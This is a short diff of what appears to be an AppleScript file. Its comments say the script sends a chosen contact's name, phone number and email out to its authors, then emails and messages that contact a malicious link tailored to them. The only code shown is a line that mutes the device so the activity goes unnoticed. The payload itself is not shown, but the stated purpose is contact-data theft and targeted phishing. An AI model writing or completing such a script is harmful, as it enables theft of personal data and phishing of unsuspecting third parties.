@@ -1,5 +1,5 @@
 -- This script finds the name of a specified Contact and emails their name, number and email to us.
--- Then it emails the Contact from the User's Email with a malicious link
+-- Then it emails and messages the specified Contact with a malicious link that has been tailored for them
 
 -- Mutes the Device
 set volume output volume 0
